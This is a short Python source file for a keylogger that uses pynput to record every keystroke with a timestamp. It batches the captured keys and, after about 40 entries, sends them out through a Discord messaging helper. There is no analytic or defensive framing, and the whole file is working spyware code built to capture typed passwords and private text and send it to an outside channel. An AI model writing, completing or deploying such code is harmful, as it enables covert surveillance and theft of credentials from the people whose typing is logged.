from pynput.keyboard import Listener, Key

from discord_util import discord
from utils.time_util import get_current_date_and_time

key_log = {}


def write_file(key_list):
    result = ""
    for key in key_list:
        key = str(key).replace("'", "")
        key = key.replace("Key.space", " ")
        result += key
    print(result)
    discord.send_message(result)


# def on_press(key):
#     global keys, count
#     print(key)
#     key_log[get_current_date_and_time()] = key
#     count += 1
#     if count >= 10:
#         count = 0
#         write_file(keys)
#         keys = []

def on_press(key):
    key_log[get_current_date_and_time()] = str(key).replace("'", "")

    print()
    print("Length " + str(len(key_log)))
    print()

    # Testing with message sending
    # TODO: Implement writing json to file and sending file to discord,
    #  then create method to convert json to legible text
    if len(key_log) >= 40 and (key == Key.enter or key == Key.space):
        discord.send_message(key_log)
        key_log.clear()


def log():
    with Listener(on_press=on_press, on_release=None) as listener:
        listener.join()
